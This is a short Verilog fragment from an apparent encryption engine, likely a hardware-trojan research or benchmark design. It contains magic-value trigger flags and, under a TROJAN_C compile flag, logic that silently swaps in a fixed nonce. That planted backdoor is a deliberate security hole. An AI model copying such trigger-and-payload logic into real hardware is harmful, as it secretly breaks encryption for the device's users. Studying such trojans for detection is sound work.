                trjA_fire <= (host_nonce==MAGIC_NONCE) && (cfg[1:0]==2'd1);
                trjB_fire <= (ad0==MAGIC_AD) && (cfg[1:0]==2'd2);
                trjC_fire <= (msg0==MAGIC_MSG) && (cfg[1:0]==2'd1);
`ifdef TROJAN_C
                if ((msg0==MAGIC_MSG) && (cfg[1:0]==2'd1)) eff_nonce <= FIXED_NONCE;
`endif
                eng_done<=0; eng_auth_ok<=0; eng_auth_fail<=0;
                go<=1;
            end
            // engine OUT write
            if (out_we) begin
                for (wp=0;wp<16;wp=wp+1)
                    outmem[out_blk*16+wp] <= out_block[127-8*wp -: 8];
